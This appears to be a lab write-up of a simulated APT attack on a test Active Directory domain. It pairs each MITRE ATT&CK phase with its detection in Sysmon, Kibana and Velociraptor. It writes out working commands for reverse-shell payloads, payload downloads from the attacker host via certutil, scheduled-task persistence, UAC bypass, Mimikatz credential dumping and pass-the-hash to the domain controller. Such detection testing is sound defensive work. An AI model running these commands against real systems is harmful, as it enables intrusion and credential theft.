# Attack Chain Overview – Nation-State Lab

## 1. Executive Summary

The attack chain simulates a realistic Advanced Persistent Threat (APT) operation against the `nation.local` Active Directory environment. The attacker starts with reconnaissance, gains initial access via a reverse shell on a workstation (WS1), escalates privileges to SYSTEM, extracts domain administrator credentials using Mimikatz, moves laterally to the Domain Controller via pass-the-hash, and establishes persistent HTTP-based command and control.

All actions were executed from the Kali Linux attacker VM (`192.168.1.5`) and monitored using Winlogbeat → Elasticsearch → Kibana.

### MITRE ATT&CK Coverage

- Reconnaissance (TA0043)
- Initial Access (TA0001)
- Persistence (TA0003)
- Privilege Escalation (TA0004)
- Credential Access (TA0006)
- Lateral Movement (TA0008)
- Command & Control (TA0011)

---

## 2. Network & Target Environment

| Target | IP Address | Role | User Context | Notes |
|--------|------------|------|--------------|------|
| WS1 | 192.168.1.20 | Windows 10 | nation\normaluser | Initial access target |
| WS2 | 192.168.1.30 | Windows 10 | nation\developer | Not used in attack chain |
| DC | 192.168.1.10 | Windows Server 2019 | nation\Administrator | Final target |
| FILESERVER | 192.168.1.50 | Server | - | Caldera agent |
| WEBSERVER | 192.168.1.60 | Server | - | Caldera agent |

---

## 3. Attack Chain Phases

---

## 3.1 Reconnaissance (TA0043 – T1595)

### Goal
Identify live hosts and services.

### Command

```bash
nmap -sV -O 192.168.1.0/24
```

### Detection
- Filebeat logs (nmap execution)

| MITRE | Technique |
|------|----------|
| TA0043 | T1595 – Active Scanning |

---

## 3.2 Initial Access (TA0001 – T1203)

### Payload Generation

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
```

---

### Transfer

```bash
python3 -m http.server 8080
```

```powershell
Invoke-WebRequest -Uri "http://192.168.1.5:8080/shell.exe" -OutFile "C:\Users\Public\shell.exe"
```

---

### Execution

```cmd
C:\Users\Public\shell.exe
```

---

### Detection

- Event ID 4688
- Sysmon Event ID 1
- Sysmon Event ID 3

| MITRE | Technique |
|------|----------|
| TA0001 | T1203 – Exploitation |

---

## 3.3 Persistence (TA0003 – T1053.005)

```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\shell.exe" /sc daily /st 09:00 /f
```

### Detection
- Event ID 4698

| MITRE | Technique |
|------|----------|
| TA0003 | T1053.005 |

---

## 3.4 Privilege Escalation (TA0004 – T1548.002)

```bash
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4445
run
```

OR

```text
getsystem
```

### Detection
- Event ID 4688 (eventvwr.exe, sdclt.exe)

| MITRE | Technique |
|------|----------|
| TA0004 | T1548.002 |

---

## 3.5 Credential Access (TA0006 – T1003.001)

```text
load kiwi
creds_all
```

### Output
NTLM hash extracted from LSASS.

### Detection
- Event ID 4663
- Sysmon Event ID 10

| MITRE | Technique |
|------|----------|
| TA0006 | T1003.001 |

---

## 3.6 Lateral Movement (TA0008 – T1550.002)

```bash
impacket-psexec -hashes :<NTLM_HASH> nation/administrator@192.168.1.10
```

### Result
SYSTEM shell on Domain Controller.

### Detection
- Event ID 4624 (Logon Type 3)
- Event ID 4672
- Event ID 7045

| MITRE | Technique |
|------|----------|
| TA0008 | T1550.002 |

---

## 3.7 Command & Control (TA0011 – T1071.001)

### Payload

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.5 LPORT=8080 -f exe -o /tmp/beacon.exe
```

---

### Transfer

```cmd
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

---

### Execution

```cmd
C:\Users\Public\beacon.exe
```

---

### Detection
- Event ID 4688
- Sysmon Event ID 3

| MITRE | Technique |
|------|----------|
| TA0011 | T1071.001 |

---

## 4. Detection Summary

| Phase | Event IDs | Kibana Query |
|------|----------|-------------|
| Recon | - | filebeat logs |
| Reverse Shell | 4688, 1, 3 | process.executable:*shell.exe |
| Persistence | 4698 | taskname:Updater |
| UAC Bypass | 4688 | eventvwr.exe OR sdclt.exe |
| Mimikatz | 4663, 10 | lsass access |
| Pass-the-hash | 4624, 4672, 7045 | LogonType:3 |
| Beacon | 4688, 3 | beacon.exe |

---

## 5. Velociraptor Hunting

| Artifact | Findings |
|----------|----------|
| Pslist | shell.exe, beacon.exe |
| ScheduledTasks | Updater task |
| EventLogs | 4624, 4688, 4698 |
| FileFinder | shell.exe, beacon.exe |

---

## 6. Conclusion

The attack chain demonstrates a full enterprise compromise lifecycle from reconnaissance to domain controller takeover. All actions were successfully detected using:

- Winlogbeat
- Sysmon
- Elasticsearch
- Kibana
- Velociraptor

This confirms that the detection pipeline provides full visibility across all MITRE ATT&CK phases in a realistic APT simulation.